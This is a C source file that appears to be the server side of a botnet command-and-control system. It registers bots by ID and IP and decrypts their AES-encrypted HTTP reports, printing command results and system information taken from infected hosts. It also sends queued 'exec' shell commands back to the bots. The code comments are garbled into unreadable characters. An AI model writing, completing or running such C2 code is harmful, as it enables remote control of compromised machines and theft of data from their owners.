#include "c2_server.h"

#define BOT_TIMEOUT_SECONDS 60 // ����60����������Ϊ����

// ��init_bot_manager()�����������߳�
void init_bot_manager() {
    InitializeCriticalSection(&bot_mutex);
    memset(bot_list, 0, sizeof(bot_list));

    // Ϊÿ��Bot��λ����̶�ID
    for (int i = 0; i < MAX_BOTS; i++) {
        bot_list[i].persistent_id = i + 1; // 1-based ID
    }
    
    // ������ʱ�����߳�
    HANDLE cleaner_thread = (HANDLE)_beginthreadex(
        NULL, 0, bot_cleaner_thread, NULL, 0, NULL
    );
    if (cleaner_thread) {
        CloseHandle(cleaner_thread);
    }
}

// ��ʱ�����̺߳��� ?
unsigned __stdcall bot_cleaner_thread(void *arg) {
    while (1) {
        Sleep(10000); // ÿ10����һ��
        
        EnterCriticalSection(&bot_mutex);
        
        time_t now = time(NULL);
        
        for (int i = 0; i < MAX_BOTS; i++) {
            if (bot_list[i].bot_id[0] != '\0' && 
                (now - bot_list[i].last_seen) > BOT_TIMEOUT_SECONDS) {
                
                #ifdef _DEBUG
                printf("[Cleaner] Removing inactive bot: %s (last seen %lds ago)\n", 
                       bot_list[i].bot_id, now - bot_list[i].last_seen);
                #endif
                
                memset(&bot_list[i], 0, sizeof(BotSession));
            }
        }
        
        LeaveCriticalSection(&bot_mutex);
    }
    return 0;
}

void cleanup_bot_manager() {
    DeleteCriticalSection(&bot_mutex);
}

void update_bot_list(const char *bot_id, const char *ip) {
    EnterCriticalSection(&bot_mutex);
    
    int found = -1;
    
    // ��һ�׶Σ���������Bot��¼
    for (int i = 0; i < MAX_BOTS; i++) {
        if (strcmp(bot_list[i].bot_id, bot_id) == 0) {
            found = i;
            break;
        }
    }
    
    // �ڶ��׶Σ����ҿ��в�λ
    if (found == -1) {
        for (int i = 0; i < MAX_BOTS; i++) {
            if (bot_list[i].bot_id[0] == '\0') {
                found = i;
                break;
            }
        }
    }
    
    if (found != -1) {
        // ��������Ҫ�仯���ֶΣ�����pending_command 
        strncpy_s(bot_list[found].bot_id, sizeof(bot_list[found].bot_id), 
                 bot_id, _TRUNCATE);
        strncpy_s(bot_list[found].last_ip, sizeof(bot_list[found].last_ip),
                 ip, _TRUNCATE);
        bot_list[found].last_seen = time(NULL);
    }
    
    LeaveCriticalSection(&bot_mutex);
}

char* get_query_param(const char *query, const char *param) {
    if (!query || !param) return NULL;
    
    char *query_copy = _strdup(query);
    if (!query_copy) return NULL;
    
    char *token, *next_token = NULL;
    token = strtok_s(query_copy, "&", &next_token);
    
    while (token) {
        char *key = token;
        char *value = strchr(token, '=');
        if (value) {
            *value = '\0';
            value++;
            
            if (_stricmp(key, param) == 0) {
                char *result = _strdup(value);
                free(query_copy);
                return result;
            }
        }
        token = strtok_s(NULL, "&", &next_token);
    }
    
    free(query_copy);
    return NULL;
}

void handle_report_data(SOCKET client_socket, const char *headers, 
                        const char *body, size_t body_len) {

    // ��ȫ��ӡͷ��Ϣ����ֹ���룩
    #ifdef DEBUG_MODE
    printf("---------- Received Headers (Hex Dump) ----------\n");
    hex_dump(headers, strlen(headers)); // ʹ���µ�hex_dump����
    printf("\n---------- Header Content ----------\n");
    safe_print(headers); // ��ȫ��ӡ�ɴ�ӡ�ַ�
    printf("\n-----------------------------------\n");
    #endif
    
    // ��ȡBot ID
    char *bot_id = get_header_value(headers, "X-Bot-ID");
    if (!bot_id) {
        #ifdef DEBUG_MODE
        printf("[WARN] Missing X-Bot-ID header\n");
        #endif
        const char *response = "HTTP/1.1 400 Bad Request\r\n"
                              "Content-Length: 0\r\n"
                              "Connection: close\r\n\r\n";
        send(client_socket, response, (int)strlen(response), 0);
        return;
    }

    if (bot_id) {
         // ��ȡ�ͻ���IP
        struct sockaddr_in client_addr;
        int addr_len = sizeof(client_addr);
        char ip_str[INET_ADDRSTRLEN] = "unknown";
        
        if (getpeername(client_socket, (struct sockaddr*)&client_addr, &addr_len) == 0) {
            inet_ntop(AF_INET, &client_addr.sin_addr, ip_str, INET_ADDRSTRLEN);
        }
        
        // ����Bot�б�
        update_bot_list(bot_id, ip_str);
    }

    if (!bot_id) {
        const char *response = "HTTP/1.1 400 Bad Request\r\n"
                              "Content-Length: 0\r\n"
                              "Connection: close\r\n\r\n";
        send(client_socket, response, (int)strlen(response), 0);
        return;
    }
    
   

    // ��������
    size_t decrypted_len = body_len; 
    uint8_t *decrypted = malloc(body_len + 1);  // �����1�ֽ�
    if (!decrypted) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed\n");
        #endif
        return;
    }

    // ʹ�ô���䴦��Ľ��ܺ���
    aes_decrypt_padded((uint8_t*)body, decrypted, &decrypted_len, (uint8_t*)global_config->aes_key);
    // ��ӽ���ʧ�ܼ��
    if (decrypted_len == 0) {
        free(decrypted);
        printf("[ERROR] Decryption failed\n");
        return;
    }
    if (decrypted_len >= body_len) {
        // ������
        free(decrypted);
        printf("[ERROR] decrypted_len >= body_len \n");
        return; 
    }
    // ȷ����NULL��β
      decrypted[decrypted_len] = '\0';

    #ifdef DEBUG_MODE
        printf("[+] Received report (decrypted): ");
        safe_print((char*)decrypted);
        printf("\n");
    #endif

    // ���Խ���JSON
    json_error_t error;
    json_t *root = json_loads((char*)decrypted, 0, &error);
    int has_command = 0;
    char response_json[512] = "{\"status\":\"ack\"}";

    if (root) {
        // ����Ƿ�������ִ�н��
        json_t *type = json_object_get(root, "type");
        json_t *result = json_object_get(root, "result");
        json_t *bot_id_json = json_object_get(root, "bot_id");
        
        if (type && json_is_string(type) && result && json_is_string(result) && bot_id_json) {
            const char *type_str = json_string_value(type);
            const char *result_str = json_string_value(result);
            const char *reporting_bot_id = json_string_value(bot_id_json);
            
            if (strcmp(type_str, "result") == 0) {
                // ��������ִ�н��
                printf("\n[+] [Command Result from %s]\n%s\n", 
                    reporting_bot_id, result_str);
                has_command = 0;
            }
            else if (strcmp(type_str, "info") == 0) {
                // ����ϵͳ��Ϣ
                printf("\n[+] [System Info from %s]\n%s\n", 
                    reporting_bot_id, result_str);
                has_command = 0;
            }
            else {
                // ���ǽ�����ͣ�����Ƿ��д���������
                EnterCriticalSection(&bot_mutex);
                for (int i = 0; i < MAX_BOTS; i++) {
                    if (strcmp(bot_list[i].bot_id, bot_id) == 0 && 
                        bot_list[i].pending_command[0] != '\0') 
                    {
                        snprintf(response_json, sizeof(response_json),
                            "{\"action\":\"exec\",\"command\":\"%s\"}",
                            bot_list[i].pending_command);
                        bot_list[i].pending_command[0] = '\0';
                        has_command = 1;
                        break;
                    }
                }
                LeaveCriticalSection(&bot_mutex);
            }
        }
        else {
            // ���ǽ�����ͣ�����Ƿ��д���������
            EnterCriticalSection(&bot_mutex);
            for (int i = 0; i < MAX_BOTS; i++) {
                if (strcmp(bot_list[i].bot_id, bot_id) == 0 && 
                    bot_list[i].pending_command[0] != '\0') 
                {
                    snprintf(response_json, sizeof(response_json),
                        "{\"action\":\"exec\",\"command\":\"%s\"}",
                        bot_list[i].pending_command);
                    bot_list[i].pending_command[0] = '\0';
                    has_command = 1;
                    break;
                }
            }
            LeaveCriticalSection(&bot_mutex);
        }
        json_decref(root);
    }
    else {
        // JSON����ʧ�ܣ�����Ƿ��д���������
        EnterCriticalSection(&bot_mutex);
        for (int i = 0; i < MAX_BOTS; i++) {
            if (strcmp(bot_list[i].bot_id, bot_id) == 0 && 
                bot_list[i].pending_command[0] != '\0') 
            {
                snprintf(response_json, sizeof(response_json),
                    "{\"action\":\"exec\",\"command\":\"%s\"}",
                    bot_list[i].pending_command);
                bot_list[i].pending_command[0] = '\0';
                has_command = 1;
                break;
            }
        }
        LeaveCriticalSection(&bot_mutex);
    }

        // ��ӡ������Ϣ
    #ifdef DEBUG_MODE
        printf("[+] Sending response to bot: %s\n", response_json);
    #endif
    
    // ������Ӧ
    size_t enc_len = strlen(response_json);
    size_t max_enc_size = enc_len + 16;
    uint8_t* encrypted_response = malloc(max_enc_size);
    if (!encrypted_response) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for encryption\n");
        #endif
        return;
    }
    
    aes_encrypt_padded((uint8_t*)response_json, encrypted_response, &enc_len, 
                      (uint8_t*)global_config->aes_key);
    
    // ����HTTPͷ
    char response_header[512];
    snprintf(response_header, sizeof(response_header),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n",
        enc_len);
    
    // ʹ��send_all����ͷ
    if (send_all(client_socket, response_header, strlen(response_header)) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to send HTTP headers: %d\n", WSAGetLastError());
        #endif
        free(encrypted_response);
        return;
    }
    
    // ʹ��send_all���ͼ�������
    if (send_all(client_socket, (char*)encrypted_response, enc_len) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to send encrypted response: %d\n", WSAGetLastError());
        #endif
    } else {
        printf("[CMD] Sent to %s: %s\n", bot_id, response_json);
    }
    
    free(bot_id);
    free(decrypted);
    free(encrypted_response);
}



char *find_body_start(const char *request) {
    // ���Բ��ұ�׼�� "\r\n\r\n"
    char *pos = strstr(request, "\r\n\r\n");
    if (pos) return pos + 4;
    
    // ���Բ��ҿ��ܵı��� "\n\n"
    pos = strstr(request, "\n\n");
    if (pos) return pos + 2;
    
    // ����Բ��� "\r\n"
    pos = strstr(request, "\r\n");
    if (pos) return pos + 2;
    
    return NULL;
}



// ����ͷ��ֵ��ֱ��ʵ��
char *get_header_value(const char *headers, const char *header_name) {
    const char *search_str = header_name;
    const char *ptr = headers;
    size_t name_len = strlen(header_name);
    
    // ����������
    while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
    if (*ptr == '\r') ptr++;
    if (*ptr == '\n') ptr++;
    
    // ����������
    while (*ptr) {
        // ����Ƿ�ƥ��ͷ�����ƣ������ִ�Сд��
        if (strncasecmp(ptr, search_str, name_len) == 0) {
            const char *colon = ptr + name_len;
            if (*colon == ':') {
                colon++; // ����ð��
                
                // ����ð�ź�Ŀհ�
                while (*colon == ' ' || *colon == '\t') colon++;
                
                // �ҵ���β
                const char *end = colon;
                while (*end && *end != '\r' && *end != '\n') end++;
                
                // ��ȡֵ
                size_t value_len = end - colon;
                char *value = malloc(value_len + 1);
                if (!value) return NULL;
                
                memcpy(value, colon, value_len);
                value[value_len] = '\0';
                return value;
            }
        }
        
        // �ƶ�����һ��
        while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
        if (*ptr == '\r') ptr++;
        if (*ptr == '\n') ptr++;
    }
    
    return NULL;
}

int get_content_length(const char *headers) {
    #ifdef DEBUG_MODE
    printf("[get_content_length] Searching for Content-Length in headers:\n%s\n", headers);
    #endif
    
    const char *ptr = headers;
    
    // ����������
    while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
    if (*ptr == '\r') ptr++;
    if (*ptr == '\n') ptr++;
    
    // ���� "Content-Length:" �ַ���
    while (*ptr) {
        #ifdef DEBUG_MODE
        printf("[get_content_length] Checking: %.*s\n", 50, ptr);
        #endif
        
        if (_strnicmp(ptr, "Content-Length:", 15) == 0) {
            ptr += 15; // ���� "Content-Length:"
            
            // �����հ�
            while (*ptr == ' ' || *ptr == '\t') ptr++;
            
            // ת������
            char *endptr;
            long len = strtol(ptr, &endptr, 10);
            
            #ifdef DEBUG_MODE
            printf("[get_content_length] Found number: %ld\n", len);
            #endif
            
            // ��֤ת��
            if (endptr > ptr && (*endptr == '\r' || *endptr == '\n' || *endptr == '\0')) {
                #ifdef DEBUG_MODE
                printf("[get_content_length] Valid Content-Length: %ld\n", len);
                #endif
                return (int)len;
            }
        }
        
        // �ƶ�����һ��
        while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
        if (*ptr == '\r') ptr++;
        if (*ptr == '\n') ptr++;
    }
    
    #ifdef DEBUG_MODE
    printf("[get_content_length] Content-Length not found\n");
    #endif
    
    return -1;
}